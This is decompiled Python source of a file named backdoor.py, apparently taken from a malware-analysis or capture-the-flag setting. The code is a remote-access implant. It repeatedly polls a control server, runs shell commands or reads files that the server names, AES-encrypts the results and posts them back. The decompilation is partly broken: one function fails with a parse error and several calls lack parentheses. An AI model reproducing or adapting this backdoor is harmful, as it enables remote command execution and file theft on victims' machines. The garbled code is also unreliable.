# decompyle3 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0]
# Embedded file name: backdoor.py
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import subprocess, time
B = "http://127.0.0.1:5000"

def cParse error at or near `POP_BLOCK' instruction at offset 60


def D():
    e = requests.get(B + "/g")
    a = e.json
    F = a["result"].split(",")
    if F[0] == "cmd":
        g = c(F[1])
    elif F[0] == "file":
        with open(F[1], "rb") as f:
            g = f.read
    g = pad(g, AES.block_size)
    I = pad(F[2].encode, AES.block_size)
    J = AES.new(I, AES.MODE_ECB)
    k = J.encrypt(g)
    requests.post(B + "/u", k)


if __name__ == "__main__":
    while True:
        time.sleep(2.5)
        e = requests.get(B)
        if e.status_code != 200:
            pass
        else:
            D()
